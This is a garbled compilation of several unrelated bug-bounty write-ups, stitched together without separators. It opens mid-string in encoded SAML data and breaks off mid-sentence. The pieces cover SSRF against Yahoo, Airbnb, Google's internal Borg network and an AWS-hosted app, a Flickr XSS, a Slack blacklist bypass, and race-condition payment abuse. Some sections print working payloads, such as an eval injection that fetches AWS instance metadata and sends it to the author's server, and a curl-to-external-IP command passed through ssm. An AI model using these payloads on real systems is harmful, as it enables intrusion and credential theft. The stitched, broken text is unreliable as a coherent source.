tUbmtSVdS62odM%2Fvl4iLCXacj8xkB0ad36ddX428%2Bx%2F31%2Fflh%2B%2Bnl%2Bs2L9%2BXl%2B7ee559VvvxfAAAA%2F%2F8%3D Now for those who don't know, SAMLRequest and SAMLResponse in SAML are base64 encoded XML , So after decoding it and trying to test for XXE and SSRF in the XML request you might get a good bug, but i failed to exploit it , for more information about this technique you can refer to the amazing write up from @seanmeals https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf that worked for me in another private program. What to do now ? So even though i could exploit this, even though i also tried to bypass the SSO itself, i couldn't just move on, tried to dig more and more in this , so when i was checking the request in burp i found something special in the GET request for the above endpoint, there was a cookie BouncerSAMLRemoteSessionHost=bouncer12-os.gh.bf2.yahoo.com; as you can see the cookie value is a website/yahoo subdomain so there is a high chance for an SSRF here. BINGO!!! Yes i was right, as you can see below i added my VPS ip address with port 4566 in the BouncerSAMLRemoteSessionHost cookie and i had netcat listening in my VPS and received a request from dip2.gq1.yahoo.com (63.25.204.23) port 48633: Press enter or click to view image in full size Its also important to mention that if you don't have VPS, Collaborator everywhere in burp can help you testing that thanks to @albinowax as i also confirmed that host is vulnerable to external DNS interactions in the X-Forwarded-For, so i could have just put the same value that burp sends in the cookie and confirm the issue without using a VPS. tried to read files or escalate this ssrf and couldn't, so i reported to yahoo and got triaged immediately, bounty not received yet but hope it will be good. Key Points Here : 1- Recon Wins, see where i reached from a “not found” response on a subdomain to a bug in another subdomain. 2- Never give up, put more efforts in what you are doing and read other hunters write-ups as it will help you to find bugs in other places. 3- For those who don't share findings where they can, i will not blame you, its your choice and i respect that but if you can just do it, do it for the community, for the new hackers here, small informations like this will help them to understand HOW to look for bugs and exploit them, we are not doing Black Magic here :) Security Bug Bounty Hackerone -- -- 18 Written by Th3G3nt3lman 2.7K followers · 3 following Security Researcher / Bug Bounty Hunter / https://twitter.com/Th3G3nt3lman Responses ( 18 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

I am going to show how i was able to read internal files of an organization using Server Site Request Forgery vulnerability. While searching for vulnerability, i encountered with one ‘JavaScript’ file. I unminified that JavaScript into readable form using http://unminify.com/ , while searching for new endpoints in that JavaScript file for more chances of getting vulnerabilities, i found one function: Press enter or click to view image in full size Function After analyzing it i was able to make request from above function as follows: Request made from function Here you can see an interesting parameter ‘filehookURL’ , so i thought it is SSRF issue because i got the response of https://www.REDACT.com , so i confirmed that it is SSRF and hence my next target was, if i can read internal files of organization. The next is to test dangerous URL schemas such as file :/// , dict:// , ftp:// and gopher :// , but i was lucky enough and i was able to read internal files from file :/// scheme. Here is the request i made to read ‘/etc/passwd’ file : Final Request to read /etc/passwd file And here is the response: I immediately reported it to the organization, and the team was very fast in response. They fixed the issue within 2 hrs of their first response and awarded me with generous bounty. So, never forgot to look into JavaScript files, as it is possible to get new endpoints from them. I hope you learned something from it. Thanks for reading.

Slash Commands; “SSRF in api.slack.com, using slash commands and bypassing the protections.” You can learn more about Slash Commands Here : “Some Slack features like “Integrations / Phabricator” and “Integration / Slash Commands” allow users to submit URL that will be accessed by the backend servers. A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, …). This blacklist can be bypassed using “[::]” as the hostname.

Due to the way the bug is triggered, I thought it deserved a write-up. Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that pushState is available). When the page is loaded, a function, q() (seen below), is called which will check the value of location.hash , and call F.iphone.showSelectedPage() . In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, F.iphone.showPageByHref() . This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from m.flickr.com . If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with http://m.flickr.com . Pretty solid check, right? Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains m.flickr.com . We can get our own external page loaded by passing in a URL like so: //fin1te.net/flickr.php?bypass=m.flickr.com The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX. Since we now have CORS in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request. All we need to do is specify a couple of headers (the additional options in the Access-Control-Allow-Headers are to prevent syntax errors in the Javascript), along with our payload. The next part of the Javascript dumps the response into an element with innerHTML . Which leads to our payload being executed. Fix This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash. websec bugbounty yahoo flickr xss cors Updated on December 12, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team.

Props to their security team for following up on that! Authors: Ben Sadeghipour Brett Buerhaus Ben and I spent more time on Airbnb the past few months and discovered a new endpoint that we had never seen before. After spending a year or so on the program, we were at the point of trying to find a new approach looking for vulnerabilities. We had the idea of going through all of the js files on Airbnb looking for new endpoints. We were already doing this manually to some degree, but decided to try and automate it. So we built a new tool that grabs js files and looks for relative URLs: Doing this we quickly found new endpoints that we had missed and found a few new vulnerabilities to report. One of the new endpoints discovered led to finding a Server-Side Request Forgery vulnerability on Airbnb. Airbnb Live Chat https://www.airbnb.com/chat We couldn't actually find the chat implemented anywhere, but we noticed the endpoint was in a JS file on the support page. Looking at the JavaScript code, we found a few AJAX requests relative to the /chat endpoint: /chat/availability /chat/estimatedWaitTime /chat/request /chat/events /chat/info/visitorTyping /chat/preSurvey After a little bit of fuzzing, we discovered this error message on https://www.airbnb.com/chat.asdf : {\"error\":{\"time\":\"2017-02-20T20:41:13.916-05:00\",\"message\":\"null for uri: /api/account/33963583/chat.asdf?v=1&param=6114639610801186\",\"internalCode\":28}} I have spent some time looking at LivePerson in the past, so I recognized that they were making API requests to the LivePerson REST API. It also appeared that the user input path is being put in the API request. Being able to specify a URL here wouldn't matter if it's hitting the LivePerson server, but it's possible that whatever is making the API request allows redirects. I reported an open redirect vulnerability to LivePerson in the past, but I never received a response regarding it. I knew it probably still exist and spent some time trying to find it. After going through the API docs a bit, I discovered that the visitorWantsToChat action would cause a header redirect with request parameter onlineURL . Open Redirect http://sales.liveperson.net/hc/5198728/?cmd=file&file=visitorWantsToChat&onlineURL=//xss.buer.haus/ssrftest&site=5198728 SSRF Payload Once we found the open redirect, we were able to make the API request to LivePerson redirect for full URL SSRF. https://www.airbnb.com/chat?cmd=file&file=visitorWantsToChat&onlineURL=https://xss.buer.haus/ssrf&site=5198728 Relative Path Traversal in Path Parameter Another interesting discovery is that you are able to traverse the LivePerson API request backwards with an encoded %5C in the path parameters. This allowed you to make calls to other endpoints on the LivePerson domain other than /api/ such as admin. Example: https://www.airbnb.com/chat.html/a..%5C..%5C..%5C..%5C..%5Casdfhc/5198728/?cmd=file&file=visitorWantsToChat&onlineURL=https://xss.buer.haus/ssrf&site=5198728 Timeline: - 2/16/17: Reported and fixed within 30 minutes"}

Primary Menu Skip to content OpnSec About Me Into the Borg – SSRF inside Google production network July 20, 2018 | 7 Comments Intro – Testing Google Sites and Google Caja In March 2018, I reported an XSS in Google Caja , a tool to securely embed arbitrary html/javascript in a webpage. In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was vulnerable to the XSS. However, the XSS wasn’t exploitable there. Google Caja parses html/javascript and modifies it to remove any javascript sensitive content, such as iframe or object tags and javascript sensitive properties such as document.cookie. Caja mostly parses and sanitizes HTML tags on the client side. However, for remote javascript tag (<script src=”xxx”>), the remote resource was fetched, parsed and sanitized on the server-side. I tried to host a javascript file on my server (https://[attacker].com/script.js) and check if the Google Sites server would fall for the XSS when parsed server-side but the server replied that https://[attacker].com/script.js was not accessible. After a few tests, I realised that the Google Sites Caja server would only fetch Google-owned resources like https://www.google.com or https://www.gstatic.com, but not any external resource like https://www.facebook.com. That’s a strange behavior because this functionality is meant to fetch external resources so it looks like a broken feature. More interestingly, it is hard to determine whether an arbitrary URL belongs to Google or not, given the breadth of Google services. Unless… Finding an SSRF in Google Whenever I find an endpoint that fetches arbitrary content server-side, I always test for SSRF. I did it a hundred times on Google services but never had any luck. Anyway the only explanation for the weird behavior of the Google Caja server was that the fetching was happening on the internal Google network and that is why it could only fetch Google-owned resources but not external resources. I already knew this was a bug, now the question was whether it was a security bug! It’s very easy to host and run arbitrary code on Google servers, use Google Cloud services! I created a Google App Engine instance and hosted a javascript file. I then used the URL of this javascript file on Google Sites as a external script resource and updated the Google Sites page. The javascript was successfully fetched and parsed by Google Caja server. I then checked my Google App Engine instance logs to see from where the resource was fetched and it came from 10.x.x.201, a private network IP! This looked very promising. I used the private IP as the url for the Google Sites javascript external resource and waited for the moment of truth. The request took more than 30 seconds to complete and at that time I really thought the request was blocked and I almost closed the page since I never had any luck with SSRF on Google before. However, when Google Caja replied, I saw that the reply size wasn’t around 1 KB like for a typical error message but 1 MB instead! One million bytes of information coming from a 10.x.x.x IP from Google internal network, I can tell you I was excited at this point! 🙂 I opened the file and indeed it was full of private information from Google! \\o/ Google, from the inside First I want to say that I didn’t scan Google’s internal network. I only made 3 requests in the network to confirm the vulnerability and immediately sent a report to Google VRP. It took 48 hours to Google to fix the issue (I reported it on a Saturday), so in the meantime I couldn’t help but test 2-3 more requests to try to pivot the SSRF vulnerability into unrestricted file access or RCE but without luck. The first request was to http://10.x.x.201/. It responded with a server status monitoring page of a “Borglet”. After a Google search, I could confirm that I was indeed inside Borg, Google’s internal large-scale cluster management system ( here is a overview of the architecture). Google have open sourced the successor of Borg, Kubernetes in 2014. It seems that while Kubernetes is getting more and more popular, Google is still relying on Borg for its internal production infrastructure, but I can tell you it’s not because of the design of Borg interfaces! (edit: this is intended as a joke 😛 ) The second request was to http://10.x.x.1/ and it was also a monitoring page for another Borglet. The third request was http://10.x.x.1/getstatus, a different status monitoring page of a Borglet with more details on the jobs like permissions, arguments. Each Borglet represents a machine, a server. On the hardware side, both servers were using Haswell’s CPU @2.30GHz with 72 cores, which corresponds to a set of 2 or 3 Xeon E5 v3. Both servers were using the CPUs at 77%. They had 250GB of RAM, which was used at 70%. They had 1 HDD each with 2TB and no SSD. The HDD were almost empty with only 15GB used, so the data is stored elsewhere. The processing jobs (alloc and tasks) are very diverse, I believe this optimizes ressource usage with some jobs using memory, others using CPU, network, some with high priority, etc… Some services seem very active : Video encoding, Gmail and Ads. That should not be surprising since video processing is very heavy, Gmail is one of the main Google services and Ads is, well, Google’s core business. 😉 I didn’t see Google Sites or Caja in the jobs list, so either the SSRF was going through a proxy or the Borglet on 10.x.x.201 was from a different network than the 10.x.x.201 IP I saw in my Google App Engine instance logs. Regarding the architecture, we can find jobs related to almost all of the components of the Google Stack , in particular MapReduce, BitTable, Flume, GFS… On the technology side, Java seems to be heavily used. I didn’t see any mention of Python, C++, NodeJS or Go, but that doesn’t mean it wasn’t used so don’t draw conclusions. 😛 I should mention that Borg, like Kubernetes, relies on containers like Docker, and VMs. For video processing, it seems they are using Gvisor , a Google open-source tool that looks like a trade-off between containers performance and VMs security. Parameters gives some information on how to reach the applications through network ports. On Borg, it seems that all applications on a server share the same IP address and each has some dedicated ports. Apps arguments were the most fun part for me because it is almost code. I didn’t find Google Search secret algorithm but there was some cool queries like this: MSCR(M(Customer.AdGroupCriterion+Customer.AdGroupCriterion-marshal+FilterDurianAdGroupCriterion+FilterNeedReviewAdGroupCriterion+GroupAdGroupCriterionByAdGroupKey+JoinAdGroupData/MakeUnionTable:3)+M(JoinAdGroupData/MakeUnionTable:2)+M(Customer.AdGroup+Customer.AdGroup-marshal+FilterDurianAdGroup+ParDo(AdGroupDataStripFieldsFn)+JoinAdGroupData/MakeUnionTable)+R(JoinAdGroupData/GroupUnionTables+JoinAdGroupData/ConstructJoinResults+JoinAdGroupData/ExtractTuples+ExtractCreativeAndKeywordReviewables)) If you wonder what’s Gmail system user, it’s gmail@prod.google.com There is also a user “legal-discovery@prod.google.com” that has permission “auth.impersonation.impersonateNormalUser” on “mdb:all-person-users”. (edit: for clarification, I just saw these strings close to each other in a big array and assumed that’s what it meant) There was also a little bit of history which showed that most jobs where aborted before finishing. At last, there was a lot of url to other servers or applications endpoints. In particular, I tried to access a promising-looking http://wiki/ url but it didn’t work. I tested a /getFile?FileName=/sys/borglet/borglet.INFO url but got an unauthorized response. I also tried to change the FileName parameter but got error messages. Google VRP response I reported the issue on Saturday May 12, 2018, and it was automatically triaged as a P3 (medium priority) issue. On Sunday I sent an email to Google Security that they might want someone to have a look at this. On Monday morning the issue was escalated to P0 (critical) then later decreased to P1. On Monday night the vulnerable endpoint was removed and the issue fixed. It’s not easy to determine the impact of an SSRF because it really depends on what’s in the internal network. Google tends to keep most of its infrastructure available internally and uses a lot of web endpoints, which means that in case of a SSRF, an attacker could potentially access hundreds if not thousands of internal web applications. On the other hand, Google heavily relies on authentication to access resources which limits the impact of a SSRF. In this case, the Borglet status monitoring page wasn’t authenticated, and it leaked a lot of information about the infrastructure. My understanding is that in Kubernetes, this page is authenticated. Google VRP rewarded me with $13,337, which corresponds to something like unrestricted file access! They explained that while most internal resources would require authentication, they have seen in the past dev or debug handlers giving access to more than just info leaks, so they decided to reward for the maximum potential impact. I’d like to thank them for the bounty and for their quick response. That’s it for this story, I hope you enjoyed it as much I did and feel free to comment! Tweet Google Borg , Google , Kubernetes , SSRF 7 comments on “ Into the Borg – SSRF inside Google production network ” Joe Ovez says: July 20, 2018 at 8:48 pm This is a great find. SSRF is a really unappreciated vulnerability; it is usually game-over. That it came from a Caja audit adds some tasty irony. A friendly word of advice: when you find flaws like this (you, the reader, not you, the guy who wrote this post), think carefully before disclosing internal network details you discover like this writer did. The internal details of a target network don’t become public domain simply because you found a vulnerability. There are firms that get extremely itchy about this kind of stuff getting published, and I can’t blame them. Engue Gillier says: July 20, 2018 at 9:59 pm Thanks! You’re right, disclosure should be done responsibly. I believe I didn’t disclose any sensitive information, my post is just informative, with a little bit of humor that might not be understood by everybody 😛 My intent is to show that there is no magic behind this, it’s just engineering, and it’s beautiful when it’s well done!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAWS takeover through SSRF in JavaScript Â· Gwendal Le Coguic Gwendal Le Coguic Posts Courses Clients Projects CVEs Press AWS takeover through SSRF in JavaScript October 2, 2018 8 minutes read bug bounty â¢ aws â¢ ssrf â¢ javascript Here is the story of a bug I found in a private bug bounty program on Hackerone . It took me exactly 12h30 -no break- to find it, exploit and report. I was able to dump the AWS credentials, this lead me to fully compromise the account of the company: 20 buckets and 80 EC2 instances (Amazon Elastic Compute Cloud) in my hands. Besides the fact that it’s one of my best bug in my hunter career, I also learnt alot during this sprint, so let’s share! Intro As I said, the program is private so the company, let’s call it: ArticMonkey. For the purpose of their activity -and their web application- ArticMonkey has developed a custom macro language, let’s call it: Banan++. I don’t know what language was initially used for the creation of Banan++ but from the webapp you can get a JavaScript version, let’s dig in! The original banan++.js file was minified, but still huge, 2.1M compressed, 2.5M beautified, 56441 lines and 2546981 characters, enjoy. No need to say that I didn’t read the whole sh… By searching some keywords very specific to Banan++, I located the first function at line 3348. About 135 functions were available at that time. This was my playground. Spot the issue I started to read the code by the top but most of the functions were about date manipulation or mathematical operations, nothing really insteresting or dangerous. After a while, I finally found one called Union() that looked promising, below the code: helper . prototype . Union = function () { for ( var _len22 = arguments . length , args = Array( _len22 ), _key22 = 0 ; _key22 < _len22 ; _key22 ++ ) args [ _key22 ] = arguments [ _key22 ]; var value = args . shift (), symbol = args . shift (), results = args . filter ( function ( arg ) { try { return eval( value + symbol + arg ) } catch ( e ) { return ! 1 } }); return !! results . length } Did you notice that? Did you notice that kinky eval() ? Looks sooooooooooo interesting! I copied the code on a local HTML file in order to perform more tests. Basically the function can take from 0 to infinite arguments but start to be useful at 3. The eval() is used to compare the first argument to the third one with the help of the second, then the fourth is tested, the fifth etc… Normal usage should be something like Union(1,'<',3); and the returned value true if at least one of these tests is true or false . However there is absolutely no sanitization performed or test regarding the type and the value of the arguments. With the help of my favourite debugger alert() I understood that an exploit could be triggered in many different ways: Union ( 'alert()//' , '2' , '3' ); Union ( '1' , '2;alert();' , '3' ); Union ( '1' , '2' , '3;alert()' ); ... Find an injection point Ok so I had a vulnerable function, which is always good, but what I needed was an input to inject some malicious code. I remembered that I already seen some POST parameters using Banan++ functions so I performed a quick search in my Burp Suite history. Got it: POST /REDACTED HTTP / 1.1 Host : api.REDACTED.com Connection : close Content-Length : 232 Accept : application/json, text/plain, */* User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3502.0 Safari/537.36 autochrome/red Content-Type : application/json;charset=UTF-8 Referer : https://app.REDACTED.com/REDACTED Accept-Encoding : gzip, deflate Accept-Language : fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Cookie : auth=REDACTED { ...REDACTED..., \"operation\" : \"( Year( CurrentDate() ) > 2017 )\" } Response: HTTP / 1.1 200 OK Content-Type : application/json; charset=utf-8 Content-Length : 54 Connection : close X-Content-Type-Options : nosniff X-Xss-Protection : 1 Strict-Transport-Security : max-age=15768000; includeSubDomains ...REDACTED... [{ \"name\" : \"REDACTED\" , ...REDACTED... }] The parameter operation seems to be a good option. Time for testing! Perform the injection Since I didn’t know anything about Banan++, I had to perform some tests in order to find out what kind of code I could inject or not. Sort of manual fuzzing. { ...REDACTED..., \"operation\" : \"'\\\"><\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : null } [] { ...REDACTED..., \"operation\" : \"0\" } [] { ...REDACTED..., \"operation\" : \"1\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"a\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"a=1\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"alert\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"alert()\" } { \"status\" : 400 , \"message\" : \"Function 'alert' is not defined\" } { ...REDACTED..., \"operation\" : \"Union()\" } [] What I conclued here was: I cannot inject whatever JavaScript I want I can inject Banan++ functions the response seems to act like a true/false flag depending if the interpretation of parameter operation is true or false (which was very useful to validate the code I injected) Let’s continue with Union() : { ...REDACTED..., \"operation\" : \"Union(1,2,3)\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union(a,b,c)\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union('a','b','c')\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union('a';'b';'c')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'2';'3')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'<';'3')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'>';'3')\" } [] ] Perfect! If 1 < 3 then the response contains valid datas (true), but if 1 > 3 then the response is empty (false). Parameters must be separated by a semi colon. I could now try a real attack. fetch is the new XMLHttpRequest Because the request is an ajax call to the api that only returns JSON datas, it’s obviously not a client side injection. I also knew from a previous report that ArticMonkey tends to use alot JavaScript server side. But it doesn’t matter, I had to try everything, maybe I could trigger an error that would reveal informations about the system the JavaScript runs on. Since my local testing, I knew exactly how to inject my malicious code. I tried basic XSS payloads and malformed JavaScript but all I got was the error previously mentionned. I then tried to fire an HTTP request. With an ajax call first: x = new XMLHttpRequest ; x . open ( 'GET' , 'https://poc.myserver.com' ); x . send (); But didn’t receive anything. I tried HTML injection: i = document. createElement ( 'img' ); i . src = '<img src=\"https://poc.myserver.com/xxx.png\">' ; document. body . appendChild ( i ); But didn’t receive anything! More tries: document. body . innerHTML += '<img src=\"https://poc.myserver.com/xxx.png\">' ; document. body . innerHTML += '<iframe src=\"https://poc.myserver.com\">' ; But didn’t receive anything!!! Sometimes you know, you have to test stupid things by yourself to understand how stupid it was… Obviously it was a mistake to try to render HTML code, but hey! I’m just a hacker… Back to the ajax request, I stayed stuck there for a while. It took me quite a long time to figure out how to make it work. I finally remembered that ArticMonkey uses ReactJS on their frontend, I would later learnt that they use NodeJS server side. Anyway, I checked on Google how to perform an ajax request with it and found the solution in the official documentation which lead me to the fetch() function which is the new standard to perform ajax calls, that was the key. I injected the following: fetch ( 'https://poc.myserver.com' ) And immediately got a new line in my Apache log. Being able to ping my server is a thing but it’s a blind SSRF, I had no response echoed back. I had the idea to chain two requests where the second would send the result of the first one. Something like: x1 = new XMLHttpRequest ; x1 . open ( 'GET' , 'https://...' , false ); x1 . send (); r = x1 . responseText ; x2 = new XMLHttpRequest ; x2 . open ( 'GET' , 'https://poc.myserver.com/?r=' + r , false ); x2 . send (); Again it took me while to get the correct syntax with fetch() . Thanks StackOverflow . I ended with the following code which works pretty well: fetch ( 'https://...' ). then ( res => res . text ()). then (( r )=> fetch ( 'https://poc.myserver.com/?r=' + r )); Of course, Origin policy applies. SSRF for the win I firstly tried to read local files: fetch ( 'file:///etc/issue' ). then ( res => res . text ()). then (( r )=> fetch ( 'https://poc.myserver.com/?r=' + r )); But the response ( r parameter) in my Apache log file was empty. Since I found some S3 buckets related to ArticMonkey ( articmonkey-xxx ), I thought that this company might also use AWS servers for their webapp (which was also confirmed by the header in some responses x-cache: Hit from cloudfront ). I quickly jumped on the list of the most common SSRF URL for Cloud Instances . And got a nice hit when I tried to access the metadatas of the instance. Decoded output is the directory listing returned: ami-id ami-launch-index ami-manifest-path block-device-mapping/ hostname iam/ ... Final payload: {...REDACTED...,\"operation\":\"Union('1';'2;fetch(\\\"http://169.254.169.254/latest/meta-data/\\\").then(res=>res.text()).then((r)=>fetch(\\\"https://poc.myserver.com/?r=\\\"+r));';'3')\"} Since I didn’t know anything about AWS metadatas, because it was my first time in da place. I took time to explore the directories and all files at my disposition. As you will read everywhere, the most insteresting one is http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE> . Which returned: { \"Code\" : \"Success\" , \"Type\" : \"AWS-HMAC\" , \"AccessKeyId\" : \"...REDACTED...\" , \"SecretAccessKey\" : \"...REDACTED...\" , \"Token\" : \"...REDACTED...\" , \"Expiration\" : \"2018-09-06T19:24:38Z\" , \"LastUpdated\" : \"2018-09-06T19:09:38Z\" } Exploit the credentials At that time, I though that the game was ended. But for my PoC I wanted to show the criticity of this leak, I wanted something really strong! I tried to use those credentials to impersonate the company. You have to know that they are temporary credentials, only valid for a short period, 5mn more or less. Anyway, 5mn is supposed to be more than enough to update my own credentials to those ones, 2 copy/paste, I can handle that… err… I asked for help on Twitter from SSRF and AWS master. Thank guys, I truely appreciate your commitment, but I finally found the solution in the UserGuide of AWS Identity and Access Management . My mistake, except to not read the documentation (…), was to only use AccessKeyId and SecretAccessKey , this doesn’t work, the token must also be exported. Kiddies… $ export AWS_ACCESS_KEY_ID = AKIAX7EFFWBWFRW3ACIR... $ export AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI... $ export AWS_SESSION_TOKEN = AQoDYXdzEJr... Checking my idendity with the following command proved that I was not myself anymore. aws sts get-caller-identity And then… Left: listing of the EC2 instances configured by ArticMonkey. Probably a big part -or the whole- of their system. Right: the company owns 20 buckets containing, highly sensitive datas from customers, static files for the web application and, according to the name of the buckets, probably logs/backups of their servers. Impact: lethal. Conclusion I learnt alot because of this bug: ReactJS, fetch(), AWS metadatas. RTFM! The official documentation is always a great source of (useful) informations. At each step new problems appeared. I had to search everywhere, try many different things, I had to push my limits to not give up. I now know that I can fully compromise a system by myself starting from 0, which is a great personal achievement and statisfaction :) When someone tells you that you’ll never be able to do something, don’t waste your time to bargain with these peoples, simply prove them they’re wrong by doing it.

Escalating SSRF to RCE: I went to try some potential exploitation scenarios. Escalating via [ssm send-command] fail After a few pieces of research tried to use AWS Systems Manager [ssm] command. The role is not authorized to perform this command. I was hoping to escalate it with aws ssm send-command. ~# aws ssm send-command — instance-ids “instanceId” — document-name “AWS-RunShellScript” — comment “whoami” — parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ — output text — region=region An error occurred (AccessDeniedException) when calling the SendCommand operation: User: arn:aws:sts::765xxxxxxxxx:assumed-role/aws-elasticbeanstalk-ec2-role/i-007xxxxxxxxxxxxxx is not authorized to perform: ssm:SendCommand on resource: arn:aws:ec2:us-east-1:765xxxxxxxxx:instance/i-00xxxxxxxxxxxxxx Press enter or click to view image in full size Escalating via [SSH] fail SSH port is closed.

My name is Leks and this is the happy story of combining two vulnerabilities. Press enter or click to view image in full size [PART 1 — Logical] While testing an application with the ability to make a payment and increase the balance, I came across incorrect processing of zeros after the decimal point in the sum. Everywhere, the program rounds the numbers to a larger amount and the same thing in final price for billing. Buut … not everything was so simple with 0.009 . It turned out that the service simply credited 0.01 price without checking a bank card (respectively, and without withdrawing money). Then I was already relaxed, and I think this is a buzz, it will be P1 — unlimited adding money to the account. But after the second time, I got a little upset — it turned out that the larger the amount we put into the account, the more the minimum deposit to our account grows, so after the second time, when we had 0.02 on the account, our trick with 0.009 did not work, and we can’t replenish more(the rule was: you can make a payment only for sum, more or equal than you have on your account, thats why after 2nd time, I do have 0.02 , and cant purchase 0.01 as its little). After the opening of such an unpleasant surprise, I wrote down in ToDo list the fact of such vuln. At that time, I already exploited the Condition Race before, so I just wrote it down as an idea to use. [PART 2 — Technical] 1 month later… :) I decided to return to this vulnerability and exploit it further. Since there was an idea with Race Conditions. I need to explain how does Race Condition works here. When we start several threads at the same time, some of them catch old data on the server, what we use to our advantage. Press enter or click to view image in full size We have balance (a=0) and minimum deposit replenishment (b=0), which, as we know, increasing after every purchase. When we are increasing the balance (a+1), servers is looking at minimum deposit(b) and checks that the number to which we replenish is bigger than the balance (1≥b). In example of 8 requests: 1-4 requests caught on the server limit b=0, so only 4th request caught b=1. 5–8 made the same things. Because the server works with threads separately — the variables with which they begin to work do not change during this work. So in 5–8 requests — b=1, and only on 9th request data is updated, and the request no longer passes by the rules of the limit. This is important to understand — threads do not communicate with each other, like — Hey dude, I have +1 here, you need to change limit — Oh ok, np bro. Thats why we can create a race condition, during what threads use a non-updated date. Ok? Let’s go to exploiting. I started writing scripts. As I love python ❤, and I think that I can write everything on it, my scripts were on it. But after some time have found such a tool — I did not try it myself, but maybe it will make your life easier. aaronhnatiw/race-the-web Tests for race conditions in web applications by sending out a user-specified number of requests to a target URL (or… github.com So let’s look a little bit of scripts we need to exploit Race Condition. Race Conditions is exploiting easy — we just need to create scripts with requests and send them simultaneously to the site — and the more the better (for a white hacker, 20 requests will come down, only to show that the vulnerability exists, but if you want to exploit the vulnerability with maximum benefit — then you need a lot of requests). The request to purchase was looked like: Press enter or click to view image in full size I’m using python “requests”: Press enter or click to view image in full size Such script making POST-request with headers and tokens And cheers! Finally, he hacked and everything is behind! — you thought. Well, not so easy :) In my case, I had two pages, on one I make a payment, on the second I confirm, so I had to get unique tokens that were stored in the HTML code. Everything sounds easy — one script in this way created requests and collected tokens in a separate file, and the second took these tokens, substituted them into forms and confirmed. But in reality it was a little hard to do, in terms of sequence logic. As a result, the logic of my PoC was this: the 1st file creates payments and collects tokens. At this time, another accepts these tokens, creates a bunch of scripts (yeap, the script creates scripts, the future is near :) and inserts tokens into their code so that each file carries a unique token. After that, he creates a script like this — operand “&” runs them at the same time (more precisely, runs the next line of the script, without waiting for the end of the current line) And boooom! Everything worked and we got the cool Race Condition :) It is sometimes difficult to exploit such a vulnerability due to tokens, but it is nevertheless possible — just write down what is going on and make a plan. Many thanks to the HackerOne support team, as they quickly provided me with an account to test it after a letter with a request, and the owners of the program quickly confirmed the vulnerability and kept up to date with all the updates. So just keep thinking how to hack — and you will make it :) We reached the end, so I want to say — it is my first writeup, and you can follow me on Twitter to find out more — I will try to do it more often: Oleksandr Opanasiuk The latest Tweets from Oleksandr Opanasiuk (@Lekssik2).

Hope you are doing well . In this post I would be covering how I ended up finding an unusual race condition at an unexpected place due to a logical flaw . I’ll not be too much technical here Since this issue is more of a logical issue than the usual technical vulnerabilities . So Lets call our target app as redacted.com . It was basically a shopping website that allows the user to enter personal and CC details after selecting the product of choice . So the vulnerable URL was something like : https://www.redacted.com/checkout/36014f0cc44343434/details/ ) This presented a screen as shows . PS : I’ve taken the screenshots from the video so please don’t mind the clarity . I’ll try to explain everything . The above 2 screenshots depict the checkout page . PROBLEM I found if some error occurs on the checkout page due to some input error after the person enters his details and hit the checkout button, the same page is returned asking user to fill in correctly (Server side validation: NICE :) ) . I copied the URL (checkout) that had the partially filled form and pasted in another browser (Different account) and Boom ! I got the same partially filled information . This is a vulnerability . But We got problems :/ Now the problem was that how do I make a exploitation scenario out of it ? The Checkout URL ( https://www.redacted.com/checkout/36014f0cc44343434/details/ ) was a having a random string . I spent few time trying to reverse it , but ended up in failure . One Scenario came into my mind , What If the attacker sends the checkout URL to the victim and asks him to do the checkout . Then there may be a possibility that the attacker is able to see all the information that the victim is trying to type . But we have a problem !! The checkout page will only spit out the pre-filled information if the person has made some mistake in filling any filed . How do I do that :/ So The exploitation scenario was like : The Attacker sends the Checkout URL ( https://www.redacted.com/checkout/36014f0cc44343434/details/ ) to the victim asking him to do the checkout . (Luring him of any offer ) The victim starts to enter the checkout details . The attacker opens up the checkout URL in his window and keeps on refreshing the page constantly . The victim does some mistake (syntactical ) in entering the detail and clicks on the checkout button . The error pops up and the prefilled form is shown back to the victim . The attacker also now sees the prefilled form and gets away with profit . (CC details were not masked ) . But ………….. Ehhhh . This was not 